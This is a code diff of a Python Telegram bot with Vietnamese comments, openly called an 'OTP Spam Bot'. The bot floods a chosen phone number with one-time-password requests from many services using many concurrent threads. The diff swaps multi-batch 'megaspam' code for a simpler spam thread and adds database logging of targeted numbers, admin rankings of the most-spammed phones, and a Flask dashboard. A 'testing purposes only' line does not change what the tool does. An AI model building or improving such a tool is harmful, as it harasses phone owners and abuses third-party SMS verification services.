-        # Tạo nhiều spam ID để phân tải
-        spam_ids = []
-        batch_size = 100
-        num_batches = (count + batch_size - 1) // batch_size
-        
-        for i in range(num_batches):
-            batch_count = min(batch_size, count - i * batch_size)
-            if batch_count <= 0:
-                break
-                
-            spam_id = f"{message.from_user.id}_{int(time.time())}_{i}"
-            
-            with active_spams_lock:
-                active_spams[spam_id] = {
-                    'user_id': message.from_user.id,
-                    'phone': phone,
-                    'count': batch_count,
-                    'started_at': datetime.now(),
-                    'is_running': True,
-                    'is_megaspam': True,
-                    'batch_index': i
-                }
-            spam_ids.append(spam_id)
-            
-            # Chạy từng batch
-            thread = threading.Thread(
-                target=_run_megaspam_batch,
-                args=(spam_id, phone, batch_count, message.chat.id, msg.message_id, i),
-                daemon=True
-            )
-            thread.start()
-        
-        # Lưu thông tin megaspam
-        with active_spams_lock:
-            active_spams[f"megaspam_{message.from_user.id}"] = {
-                'spam_ids': spam_ids,
-                'total_count': count,
-                'started_at': datetime.now(),
-                'chat_id': message.chat.id,
-                'message_id': msg.message_id
-            }
-        
-        # Nút điều khiển
-        keyboard = InlineKeyboardMarkup()
-        keyboard.add(
-            InlineKeyboardButton("💥 Đang chạy MEGASPAM", callback_data="megaspam_running"),
-            InlineKeyboardButton("🛑 Dừng tất cả", callback_data=f"stop_megaspam_{message.from_user.id}")
-        )
-        
-        bot.edit_message_text(
-            f"💣 *MEGASPAM ĐANG CHẠY!*\n\n"
-            f"📱 Số: `{phone}`\n"
-            f"💥 Tổng lần: {count}\n"
-            f"📦 Số batch: {num_batches}\n"
-            f"⚡ Batch size: {batch_size}\n"
-            f"🆔 User: {message.from_user.id}\n\n"
-            f"⏳ Khởi động {num_batches} batch đồng thời...",
-            message.chat.id,
-            msg.message_id,
-            parse_mode='Markdown',
-            reply_markup=keyboard
-        )
-        
-    except Exception as e:
-        bot.reply_to(message, f"❌ Lỗi megaspam: {str(e)[:100]}")
-
-def _run_ultra_spam(spam_id, phone, count, chat_id, message_id):
-    """Chạy spam siêu tốc"""
+def run_spam_thread(spam_id, phone, count, chat_id, message_id):
+    """Chạy spam trong thread riêng"""
     try:
         start_time = time.time()
-        success = 0
-        failed = 0
+        results = spam_engine.spam_batch(phone, count, spam_id)
         
-        # Chia nhỏ thành các mini-batch
-        batch_size = 50
-        num_batches = (count + batch_size - 1) // batch_size
-        
-        for batch_idx in range(num_batches):
-            # Kiểm tra nếu đã dừng
-            with active_spams_lock:
-                spam_info = active_spams.get(spam_id)
-                if not spam_info or not spam_info.get('is_running', True):
-                    break
-            
-            batch_count = min(batch_size, count - batch_idx * batch_size)
-            
-            # Chạy batch đồng thời
-            with ThreadPoolExecutor(max_workers=100) as executor:
-                futures = []
-                
-                for i in range(batch_count):
-                    service_func = random.choice(FAST_OTP_FUNCTIONS)
-                    future = executor.submit(
-                        _execute_otp_fast,
-                        service_func,
-                        phone,
-                        service_func.__name__
-                    )
-                    futures.append(future)
-                
-                # Thu thập kết quả
-                for future in futures:
-                    try:
-                        if future.result(timeout=3):
-                            success += 1
-                        else:
-                            failed += 1
-                    except:
-                        failed += 1
-            
-            # Cập nhật tiến độ
-            processed = (batch_idx + 1) * batch_size
-            if processed > count:
-                processed = count
-            
-            elapsed = time.time() - start_time
-            speed = processed / elapsed if elapsed > 0 else 0
-            
-            if batch_idx % 2 == 0 or batch_idx == num_batches - 1:
-                try:
-                    keyboard = InlineKeyboardMarkup()
-                    keyboard.add(InlineKeyboardButton("❌ Dừng", callback_data=f"stop_{spam_id}"))
-                    
-                    bot.edit_message_text(
-                        f"⚡ *SPAM ĐANG CHẠY*\n\n"
-                        f"📱 Số: `{phone}`\n"
-                        f"📊 Tiến độ: {processed}/{count}\n"
-                        f"✅ Thành công: {success}\n"
-                        f"❌ Thất bại: {failed}\n"
-                        f"🚀 Tốc độ: {speed:.1f}/giây\n"
-                        f"⏱️ Thời gian: {elapsed:.1f}s",
-                        chat_id,
-                        message_id,
-                        parse_mode='Markdown',
-                        reply_markup=keyboard
-                    )
-                except:
-                    pass
-            
-            # Nghỉ ngắn giữa các batch
-            if batch_idx < num_batches - 1:
-                time.sleep(0.5)
+        # Tính thời gian
+        elapsed = time.time() - start_time
+        speed = count / elapsed if elapsed > 0 else 0
         
         # Hoàn thành
-        elapsed_total = time.time() - start_time
-        avg_speed = count / elapsed_total if elapsed_total > 0 else 0
-        
         with active_spams_lock:
             if spam_id in active_spams:
                 del active_spams[spam_id]
         
+        # Gửi kết quả
         try:
+            success_rate = (results['success'] / count * 100) if count > 0 else 0
+            
             bot.edit_message_text(
                 f"🎉 *HOÀN THÀNH SPAM!*\n\n"
                 f"📱 Số: `{phone}`\n"
                 f"🎯 Tổng lần: {count}\n"
-                f"✅ Thành công: {success}\n"
-                f"❌ Thất bại: {failed}\n"
-                f"📈 Tỷ lệ: {(success/count*100 if count>0 else 0):.1f}%\n"
-                f"⚡ Tốc độ TB: {avg_speed:.1f}/giây\n"
-                f"⏱️ Tổng thời gian: {elapsed_total:.1f}s",
+                f"✅ Thành công: {results['success']}\n"
+                f"❌ Thất bại: {results['failed']}\n"
+                f"📈 Tỷ lệ: {success_rate:.1f}%\n"
+                f"⚡ Tốc độ: {speed:.1f} OTP/giây\n"
+                f"⏱️ Thời gian: {elapsed:.1f}s",
                 chat_id,
                 message_id,
                 parse_mode='Markdown'
@@ -917,97 +608,41 @@ def _run_ultra_spam(spam_id, phone, count, chat_id, message_id):
         except:
             pass
         
+        # Lưu vào database nếu có
+        if db:
+            try:
+                # Lưu lịch sử
+                db['spam_history'].insert_one({
+                    'user_id': chat_id,
+                    'phone': phone,
+                    'count': count,
+                    'success': results['success'],
+                    'failed': results['failed'],
+                    'timestamp': datetime.now(),
+                    'duration': elapsed
+                })
+                
+                # Cập nhật thống kê user
+                db['users'].update_one(
+                    {'user_id': chat_id},
+                    {'$inc': {'total_spam': count, 'success_spam': results['success']}},
+                    upsert=True
+                )
+            except:
+                pass
+                
     except Exception as e:
-        print(f"Error in ultra spam: {e}")
+        print(f"Error in spam thread: {e}")
 
-def _run_megaspam_batch(spam_id, phone, count, chat_id, message_id, batch_idx):
-    """Chạy một batch megaspam"""
-    try:
-        success = 0
-        
-        # Sử dụng ProcessPool cho hiệu suất cao
-        with ProcessPoolExecutor(max_workers=multiprocessing.cpu_count()) as executor:
-            # Chia nhỏ hơn nữa
-            sub_batch_size = 10
-            num_sub_batches = (count + sub_batch_size - 1) // sub_batch_size
-            
-            for sub_idx in range(num_sub_batches):
-                # Kiểm tra dừng
-                with active_spams_lock:
-                    spam_info = active_spams.get(spam_id)
-                    if not spam_info or not spam_info.get('is_running', True):
-                        break
-                
-                sub_count = min(sub_batch_size, count - sub_idx * sub_batch_size)
-                
-                # Gửi đồng thời
-                futures = []
-                for i in range(sub_count):
-                    service_func = random.choice(FAST_OTP_FUNCTIONS)
-                    future = executor.submit(
-                        _execute_otp_fast,
-                        service_func,
-                        phone,
-                        service_func.__name__
-                    )
-                    futures.append(future)
-                
-                # Đếm thành công
-                for future in futures:
-                    try:
-                        if future.result(timeout=5):
-                            success += 1
-                    except:
-                        pass
-        
-        # Xóa spam info khi hoàn thành
-        with active_spams_lock:
-            if spam_id in active_spams:
-                del active_spams[spam_id]
-        
-    except Exception as e:
-        print(f"Error in megaspam batch: {e}")
-
-def _execute_otp_fast(func, phone, service_name):
-    """Thực thi OTP với timeout ngắn"""
-    try:
-        # Sử dụng session riêng cho mỗi request
-        session = requests.Session()
-        session.request = lambda method, url, **kwargs: requests.request(
-            method, url, timeout=3, verify=False, **kwargs
-        )
-        
-        # Gọi hàm
-        func(phone)
-        return True
-    except:
-        return False
-
-# ==============================
-# CALLBACK HANDLERS TỐI ƯU
-# ==============================
-
-@bot.callback_query_handler(func=lambda call: True)
-def handle_all_callbacks(call):
-    """Xử lý callback nhanh"""
-    try:
-        data = call.data
-        
-        if data.startswith('stop_'):
-            spam_id = data.replace('stop_', '')
-            
-            # Dừng spam thường
-            if spam_id.startswith('megaspam_'):
-                user_id = int(spam_id.replace('megaspam_', ''))
-                _stop_all_user_spam(user_id)
-                bot.answer_callback_query(call.id, "✅ Đã dừng tất cả megaspam!")
-            else:
-                with active_spams_lock:
-                    if spam_id in active_spams:
-                        active_spams[spam_id]['is_running'] = False
-                        bot.answer_callback_query(call.id, "✅ Đã dừng spam!")
-                    else:
-                        bot.answer_callback_query(call.id, "❌ Không tìm thấy spam!")
+@bot.callback_query_handler(func=lambda call: call.data.startswith('cancel_'))
+def handle_cancel_callback(call):
+    """Xử lý hủy spam"""
+    spam_id = call.data.replace('cancel_', '')
+    
+    with active_spams_lock:
+        if spam_id in active_spams:
+            active_spams[spam_id]['is_running'] = False
+            bot.answer_callback_query(call.id, "✅ Đã dừng spam!")
             
             # Xóa nút
             try:
@@ -1016,65 +651,19 @@ def handle_all_callbacks(call):
                     call.message.message_id,
                     reply_markup=None
                 )
+                bot.edit_message_text(
+                    "⏹️ Đã dừng spam!",
+                    call.message.chat.id,
+                    call.message.message_id
+                )
             except:
                 pass
-        
-        elif data == 'loading':
-            bot.answer_callback_query(call.id, "⚡ Đang chạy...")
-            
-    except Exception as e:
-        try:
-            bot.answer_callback_query(call.id, f"❌ Lỗi: {str(e)[:50]}")
-        except:
-            pass
-
-def _stop_all_user_spam(user_id):
-    """Dừng tất cả spam của user"""
-    with active_spams_lock:
-        # Tìm và dừng tất cả spam của user
-        for spam_id, info in list(active_spams.items()):
-            if info.get('user_id') == user_id:
-                info['is_running'] = False
-        
-        # Dừng megaspam nếu có
-        megaspam_key = f"megaspam_{user_id}"
-        if megaspam_key in active_spams:
-            del active_spams[megaspam_key]
-
-# ==============================
-# STATUS & ADMIN COMMANDS
-# ==============================
-
-@bot.message_handler(commands=['status'])
-def handle_status_fast(message):
-    """Trạng thái nhanh"""
-    with active_spams_lock:
-        active_count = len([s for s in active_spams.values() if s.get('is_running', True)])
-        total_queued = sum(s.get('count', 0) for s in active_spams.values())
-    
-    # Thống kê đơn giản
-    stats_text = (
-        f"⚡ *BOT STATUS - ULTRA SPEED*\n"
-        f"┌─────────────────\n"
-        f"│ Spam đang chạy: {active_count}\n"
-        f"│ OTP trong queue: {total_queued}\n"
-        f"│ Services: {len(FAST_OTP_FUNCTIONS)}\n"
-        f"│ Max Threads: {MAX_THREADS}\n"
-        f"│ Concurrent: {MAX_CONCURRENT_REQUESTS}\n"
-        f"│ User ID: `{message.from_user.id}`\n"
-        f"└─────────────────\n\n"
-        f"📊 *Các lệnh:*\n"
-        f"• /spam <số> [lần]\n"
-        f"• /megaspam <số> <lần>\n"
-        f"• /cancel\n"
-        f"• /speedtest\n"
-    )
-    
-    bot.reply_to(message, stats_text, parse_mode='Markdown')
+        else:
+            bot.answer_callback_query(call.id, "❌ Không tìm thấy spam!")
 
 @bot.message_handler(commands=['cancel'])
-def handle_cancel_fast(message):
-    """Hủy spam nhanh"""
+def handle_cancel_command(message):
+    """Hủy spam của user"""
     user_id = message.from_user.id
     
     with active_spams_lock:
@@ -1086,80 +675,438 @@ def handle_cancel_fast(message):
     
     bot.reply_to(message, f"✅ Đã hủy {len(user_spams)} spam đang chạy!")
 
-@bot.message_handler(commands=['speedtest'])
-def handle_speedtest(message):
-    """Test tốc độ bot"""
-    test_msg = bot.reply_to(message, "🧪 Đang test tốc độ...")
+@bot.message_handler(commands=['status'])
+def handle_status(message):
+    """Trạng thái bot"""
+    global is_spamming_active
     
-    # Test 10 request đồng thời
-    start_time = time.time()
+    with active_spams_lock:
+        active_count = len([s for s in active_spams.values() if s.get('is_running', True)])
+        total_queued = sum(s.get('count', 0) for s in active_spams.values())
     
-    with ThreadPoolExecutor(max_workers=50) as executor:
-        futures = [executor.submit(_test_request) for _ in range(20)]
-        results = [f.result(timeout=5) for f in futures]
-    
-    elapsed = time.time() - start_time
-    success = sum(results)
-    
-    bot.edit_message_text(
-        f"🧪 *SPEED TEST RESULTS*\n\n"
-        f"📊 Requests: 20\n"
-        f"✅ Success: {success}\n"
-        f"❌ Failed: {20 - success}\n"
-        f"⏱️ Time: {elapsed:.2f}s\n"
-        f"⚡ Speed: {(20/elapsed if elapsed>0 else 0):.1f} req/s\n"
-        f"📈 Success rate: {(success/20*100):.1f}%",
-        message.chat.id,
-        test_msg.message_id,
-        parse_mode='Markdown'
+    status_text = (
+        f"🤖 *TRẠNG THÁI BOT*\n"
+        f"┌─────────────────\n"
+        f"│ Trạng thái: {'✅ Đang hoạt động' if is_spamming_active else '⏸️ Đã tạm dừng'}\n"
+        f"│ Spam đang chạy: {active_count}\n"
+        f"│ OTP trong queue: {total_queued}\n"
+        f"│ Dịch vụ: {len(FAST_OTP_FUNCTIONS)}\n"
+        f"│ Max Threads: {MAX_THREADS}\n"
+        f"│ User ID: `{message.from_user.id}`\n"
+        f"└─────────────────"
     )
+    
+    bot.reply_to(message, status_text, parse_mode='Markdown')
 
-def _test_request():
-    """Test request tốc độ"""
-    try:
-        # Test với Google (nhanh nhất)
-        response = requests.get('https://www.google.com', timeout=2, verify=False)
-        return response.status_code == 200
-    except:
-        return False
+@bot.message_handler(commands=['mystats'])
+def handle_mystats(message):
+    """Thống kê của user"""
+    user_id = message.from_user.id
+    
+    if db:
+        try:
+            user_info = db['users'].find_one({'user_id': user_id})
+            
+            if user_info:
+                total_spam = user_info.get('total_spam', 0)
+                success_spam = user_info.get('success_spam', 0)
+                
+                stats_text = (
+                    f"📊 *THỐNG KÊ CỦA BẠN*\n"
+                    f"┌─────────────────\n"
+                    f"│ User ID: `{user_id}`\n"
+                    f"│ Username: @{user_info.get('username', 'N/A')}\n"
+                    f"│ Tổng lần spam: {total_spam}\n"
+                    f"│ Thành công: {success_spam}\n"
+                    f"│ Tỷ lệ: {(success_spam/total_spam*100 if total_spam>0 else 0):.1f}%\n"
+                    f"│ Lần hoạt động: {user_info.get('last_active', 'N/A')}\n"
+                    f"└─────────────────"
+                )
+            else:
+                stats_text = "📭 Bạn chưa có thống kê nào!"
+        except:
+            stats_text = "❌ Lỗi khi lấy thống kê!"
+    else:
+        stats_text = "📭 Database không khả dụng!"
+    
+    bot.reply_to(message, stats_text, parse_mode='Markdown')
 
 # ==============================
-# FLASK SERVER TỐI ƯU
+# ADMIN COMMANDS
+# ==============================
+
+@bot.message_handler(commands=['admin'])
+@admin_only
+def handle_admin(message):
+    """Menu admin"""
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    keyboard.add(
+        InlineKeyboardButton("📊 Thống kê", callback_data="admin_stats"),
+        InlineKeyboardButton("👥 Users", callback_data="admin_users"),
+        InlineKeyboardButton("⚙️ Cài đặt", callback_data="admin_settings"),
+        InlineKeyboardButton("📱 Phones", callback_data="admin_phones")
+    )
+    
+    bot.reply_to(message, "👑 *ADMIN PANEL*", 
+                parse_mode='Markdown', reply_markup=keyboard)
+
+@bot.message_handler(commands=['stats'])
+@admin_only
+def handle_admin_stats(message):
+    """Thống kê tổng quan"""
+    if db:
+        try:
+            total_users = db['users'].count_documents({})
+            total_spams = db['spam_history'].count_documents({})
+            blocked_phones = db['blocked_phones'].count_documents({'is_active': True})
+            
+            # Thống kê 24h
+            yesterday = datetime.now() - timedelta(days=1)
+            spams_today = db['spam_history'].count_documents({
+                'timestamp': {'$gte': yesterday}
+            })
+            
+            stats_text = (
+                f"📈 *THỐNG KÊ TỔNG QUAN*\n"
+                f"┌─────────────────\n"
+                f"│ Tổng users: {total_users}\n"
+                f"│ Tổng lần spam: {total_spams}\n"
+                f"│ Spam 24h: {spams_today}\n"
+                f"│ Số bị block: {blocked_phones}\n"
+                f"│ Spam đang chạy: {len(active_spams)}\n"
+                f"└─────────────────"
+            )
+        except:
+            stats_text = "❌ Lỗi khi lấy thống kê!"
+    else:
+        stats_text = "📭 Database không khả dụng!"
+    
+    bot.reply_to(message, stats_text, parse_mode='Markdown')
+
+@bot.message_handler(commands=['active'])
+@admin_only
+def handle_active_toggle(message):
+    """Bật/tắt bot"""
+    global is_spamming_active
+    
+    parts = message.text.split()
+    if len(parts) < 2:
+        bot.reply_to(message, 
+                    f"⚠️ Sử dụng: /active <on/off>\n"
+                    f"Trạng thái hiện tại: {'ON' if is_spamming_active else 'OFF'}")
+        return
+    
+    action = parts[1].lower()
+    
+    if action in ['on', 'true', '1', 'start']:
+        is_spamming_active = True
+        bot.reply_to(message, "✅ Đã bật bot!")
+    elif action in ['off', 'false', '0', 'stop']:
+        is_spamming_active = False
+        
+        # Dừng tất cả spam đang chạy
+        with active_spams_lock:
+            for spam_id in active_spams:
+                active_spams[spam_id]['is_running'] = False
+        
+        bot.reply_to(message, "⏸️ Đã tắt bot!")
+    else:
+        bot.reply_to(message, "⚠️ Sai cú pháp! Sử dụng: /active <on/off>")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
+def handle_admin_callbacks(call):
+    """Xử lý callback admin"""
+    try:
+        action = call.data.replace('admin_', '')
+        
+        if action == 'stats':
+            handle_admin_stats(call.message)
+        elif action == 'users':
+            if db:
+                try:
+                    users = list(db['users'].find().limit(10))
+                    
+                    if users:
+                        users_text = "👥 *TOP 10 USERS*\n\n"
+                        for i, user in enumerate(users, 1):
+                            users_text += (
+                                f"{i}. @{user.get('username', 'N/A')}\n"
+                                f"   └ Spam: {user.get('total_spam', 0)}\n"
+                            )
+                    else:
+                        users_text = "📭 Chưa có user nào!"
+                except:
+                    users_text = "❌ Lỗi khi lấy danh sách users!"
+            else:
+                users_text = "📭 Database không khả dụng!"
+            
+            bot.edit_message_text(users_text, call.message.chat.id,
+                                call.message.message_id, parse_mode='Markdown')
+            
+        elif action == 'settings':
+            settings_text = (
+                f"⚙️ *CÀI ĐẶT HỆ THỐNG*\n\n"
+                f"• MAX_THREADS: {MAX_THREADS}\n"
+                f"• MAX_CONCURRENT: {MAX_CONCURRENT_REQUESTS}\n"
+                f"• REQUEST_TIMEOUT: {REQUEST_TIMEOUT}s\n"
+                f"• MAX_SPAM_PER_PHONE: {MAX_SPAM_PER_PHONE}\n"
+                f"• COOLDOWN: {SPAM_COOLDOWN_HOURS} giờ\n"
+                f"• OTP SERVICES: {len(FAST_OTP_FUNCTIONS)}\n"
+                f"• BOT STATUS: {'🟢 ACTIVE' if is_spamming_active else '🔴 INACTIVE'}"
+            )
+            
+            bot.edit_message_text(settings_text, call.message.chat.id,
+                                call.message.message_id, parse_mode='Markdown')
+            
+        elif action == 'phones':
+            if db:
+                try:
+                    # Lấy top số điện thoại spam nhiều nhất
+                    pipeline = [
+                        {'$group': {'_id': '$phone', 'count': {'$sum': '$count'}}},
+                        {'$sort': {'count': -1}},
+                        {'$limit': 10}
+                    ]
+                    
+                    top_phones = list(db['spam_history'].aggregate(pipeline))
+                    
+                    if top_phones:
+                        phones_text = "📱 *TOP 10 SỐ ĐIỆN THOẠI*\n\n"
+                        for i, phone in enumerate(top_phones, 1):
+                            phones_text += f"{i}. {phone['_id']}: {phone['count']} lần\n"
+                    else:
+                        phones_text = "📭 Chưa có số điện thoại nào!"
+                except:
+                    phones_text = "❌ Lỗi khi lấy danh sách số!"
+            else:
+                phones_text = "📭 Database không khả dụng!"
+            
+            bot.edit_message_text(phones_text, call.message.chat.id,
+                                call.message.message_id, parse_mode='Markdown')
+            
+    except Exception as e:
+        bot.answer_callback_query(call.id, f"❌ Lỗi: {str(e)[:50]}")
+
+# ==============================
+# FLASK SERVER
 # ==============================
 
 @app.route('/')
 def home():
-    return "🚀 OTP Spam Bot - ULTRA SPEED EDITION"
+    return """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>OTP Spam Bot</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                margin: 0;
+                padding: 20px;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                color: white;
+                min-height: 100vh;
+            }
+            .container {
+                max-width: 800px;
+                margin: 0 auto;
+                background: rgba(255, 255, 255, 0.1);
+                backdrop-filter: blur(10px);
+                border-radius: 15px;
+                padding: 30px;
+                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            }
+            h1 {
+                text-align: center;
+                margin-bottom: 30px;
+                font-size: 2.5em;
+            }
+            .status-card {
+                background: rgba(255, 255, 255, 0.2);
+                border-radius: 10px;
+                padding: 20px;
+                margin: 20px 0;
+            }
+            .stats {
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+                gap: 15px;
+                margin: 20px 0;
+            }
+            .stat-item {
+                background: rgba(255, 255, 255, 0.15);
+                padding: 15px;
+                border-radius: 8px;
+                text-align: center;
+            }
+            .btn {
+                display: inline-block;
+                background: #4CAF50;
+                color: white;
+                padding: 10px 20px;
+                border-radius: 5px;
+                text-decoration: none;
+                margin: 5px;
+                transition: background 0.3s;
+            }
+            .btn:hover {
+                background: #45a049;
+            }
+            .btn-stop {
+                background: #f44336;
+            }
+            .btn-stop:hover {
+                background: #d32f2f;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>🚀 OTP Spam Bot Dashboard</h1>
+            
+            <div class="status-card">
+                <h2>📊 System Status</h2>
+                <div class="stats">
+                    <div class="stat-item">
+                        <h3>Bot Status</h3>
+                        <p id="bot-status">Loading...</p>
+                    </div>
+                    <div class="stat-item">
+                        <h3>Active Spams</h3>
+                        <p id="active-spams">0</p>
+                    </div>
+                    <div class="stat-item">
+                        <h3>OTP Services</h3>
+                        <p>""" + str(len(FAST_OTP_FUNCTIONS)) + """</p>
+                    </div>
+                    <div class="stat-item">
+                        <h3>Max Threads</h3>
+                        <p>""" + str(MAX_THREADS) + """</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div style="text-align: center; margin-top: 30px;">
+                <a href="/health" class="btn">Health Check</a>
+                <a href="/stats" class="btn">API Stats</a>
+                <button onclick="toggleBot()" class="btn btn-stop" id="toggle-btn">Stop Bot</button>
+            </div>
+            
+            <div style="margin-top: 30px; text-align: center;">
+                <p>⚡ Ultra Speed Edition | Made with ❤️ for testing purposes only</p>
+            </div>
+        </div>
+        
+        <script>
+            async function updateStatus() {
+                try {
+                    const response = await fetch('/health');
+                    const data = await response.json();
+                    
+                    document.getElementById('bot-status').textContent = data.status.toUpperCase();
+                    document.getElementById('active-spams').textContent = data.active_spams || 0;
+                    
+                    // Update button text
+                    const btn = document.getElementById('toggle-btn');
+                    if (data.status === 'healthy') {
+                        btn.textContent = 'Stop Bot';
+                        btn.className = 'btn btn-stop';
+                    } else {
+                        btn.textContent = 'Start Bot';
+                        btn.className = 'btn';
+                    }
+                } catch (error) {
+                    console.error('Error fetching status:', error);
+                }
+            }
+            
+            async function toggleBot() {
+                const btn = document.getElementById('toggle-btn');
+                const action = btn.textContent.includes('Stop') ? 'stop' : 'start';
+                
+                try {
+                    const response = await fetch('/' + action, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ action: action })
+                    });
+                    
+                    if (response.ok) {
+                        updateStatus();
+                    }
+                } catch (error) {
+                    console.error('Error toggling bot:', error);
+                }
+            }
+            
+            // Update status every 5 seconds
+            updateStatus();
+            setInterval(updateStatus, 5000);
+        </script>
+    </body>
+    </html>
+    """
 
 @app.route('/health')
 def health():
+    """Health check endpoint"""
     with active_spams_lock:
-        active = len(active_spams)
+        active_count = len([s for s in active_spams.values() if s.get('is_running', True)])
     
     return {
-        'status': 'healthy',
-        'active_spams': active,
+        'status': 'healthy' if is_spamming_active else 'stopped',
+        'active_spams': active_count,
         'timestamp': datetime.now().isoformat(),
-        'version': 'ultra_speed_1.0'
+        'version': 'ultra_speed_1.0',
+        'services': len(FAST_OTP_FUNCTIONS)
     }
 
 @app.route('/stats')
-def stats():
+def web_stats():
+    """Stats endpoint"""
     with active_spams_lock:
-        active_spam_count = len([s for s in active_spams.values() if s.get('is_running', True)])
+        active_count = len([s for s in active_spams.values() if s.get('is_running', True)])
+        total_queued = sum(s.get('count', 0) for s in active_spams.values())
     
     return {
         'performance': {
             'max_threads': MAX_THREADS,
             'max_concurrent': MAX_CONCURRENT_REQUESTS,
-            'otp_functions': len(FAST_OTP_FUNCTIONS),
-            'session_pool': SESSION_POOL_SIZE
+            'otp_services': len(FAST_OTP_FUNCTIONS),
+            'request_timeout': REQUEST_TIMEOUT
         },
         'current': {
-            'active_spams': active_spam_count,
-            'total_queued': sum(s.get('count', 0) for s in active_spams.values())
+            'active_spams': active_count,
+            'total_queued': total_queued,
+            'bot_status': 'active' if is_spamming_active else 'stopped',
+            'database': 'connected' if db else 'disconnected'
         }
     }
+
+@app.route('/stop', methods=['POST'])
+def stop_bot():
+    """Stop bot endpoint"""
+    global is_spamming_active
+    
+    is_spamming_active = False
+    
+    # Stop all active spams
+    with active_spams_lock:
+        for spam_id in active_spams:
+            active_spams[spam_id]['is_running'] = False
+    
+    return {'status': 'bot stopped', 'active_spams_stopped': len(active_spams)}
+
+@app.route('/start', methods=['POST'])
+def start_bot():
+    """Start bot endpoint"""
+    global is_spamming_active
+    is_spamming_active = True
+    return {'status': 'bot started'}
 
 # ==============================
 # KHỞI CHẠY
@@ -1168,41 +1115,56 @@ def stats():
 def run_flask():
     """Chạy Flask server"""
     port = int(os.getenv('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, threaded=True)
+    print(f"{Fore.CYAN}🌐 Flask server starting on port {port}{Fore.RESET}")
+    app.run(host='0.0.0.0', port=port, debug=False)
 
 def run_telegram_bot():
     """Chạy Telegram bot"""
-    print("=" * 60)
-    print("🚀 OTP SPAM BOT - ULTRA SPEED EDITION")
-    print("=" * 60)
-    print(f"⚡ Max Threads: {MAX_THREADS}")
-    print(f"🚀 Concurrent Requests: {MAX_CONCURRENT_REQUESTS}")
-    print(f"📱 OTP Services: {len(FAST_OTP_FUNCTIONS)}")
-    print(f"🔧 CPU Cores: {multiprocessing.cpu_count()}")
-    print(f"💾 MongoDB: {DATABASE_NAME}")
-    print("=" * 60)
-    print("🤖 Starting Ultra Speed Bot...")
+    print(f"{Fore.GREEN}🤖 Starting Telegram Bot...{Fore.RESET}")
     
-    # Khởi tạo request sessions
-    init_request_sessions()
-    
-    # Khởi động bot
-    bot.infinity_polling(timeout=60, long_polling_timeout=60)
+    try:
+        # Test bot connection
+        bot_info = bot.get_me()
+        print(f"{Fore.GREEN}✅ Bot connected: @{bot_info.username}{Fore.RESET}")
+        
+        print(f"{Fore.CYAN}⚡ Ultra Speed OTP Spam Bot{Fore.RESET}")
+        print(f"{Fore.YELLOW}=============================={Fore.RESET}")
+        print(f"{Fore.MAGENTA}• OTP Services: {len(FAST_OTP_FUNCTIONS)}{Fore.RESET}")
+        print(f"{Fore.MAGENTA}• Max Threads: {MAX_THREADS}{Fore.RESET}")
+        print(f"{Fore.MAGENTA}• Database: {'Connected' if db else 'Not connected'}{Fore.RESET}")
+        print(f"{Fore.MAGENTA}• Admins: {len(ADMIN_IDS)} users{Fore.RESET}")
+        print(f"{Fore.YELLOW}=============================={Fore.RESET}")
+        
+        # Start polling
+        bot.infinity_polling(timeout=60, long_polling_timeout=60)
+        
+    except Exception as e:
+        print(f"{Fore.RED}❌ Bot error: {e}{Fore.RESET}")
+        raise
 
 if __name__ == '__main__':
-    # Tắt logging để tăng tốc
+    # Cấu hình logging
+    logging.basicConfig(
+        level=logging.WARNING,
+        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+    )
+    
+    # Tắt log không cần thiết
     logging.getLogger('requests').setLevel(logging.WARNING)
     logging.getLogger('urllib3').setLevel(logging.WARNING)
-    logging.getLogger('pymongo').setLevel(logging.WARNING)
     
     # Khởi chạy Flask trong thread riêng
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
     
+    # Đợi một chút để Flask khởi động
+    time.sleep(2)
+    
     # Khởi chạy Telegram bot
     try:
         run_telegram_bot()
     except KeyboardInterrupt:
-        print("\n👋 Bot stopped")
+        print(f"\n{Fore.YELLOW}👋 Bot stopped by user{Fore.RESET}")
     except Exception as e:
-        print(f"❌ Bot error: {e}")
+        print(f"{Fore.RED}❌ Fatal error: {e}{Fore.RESET}")
+        sys.exit(1)
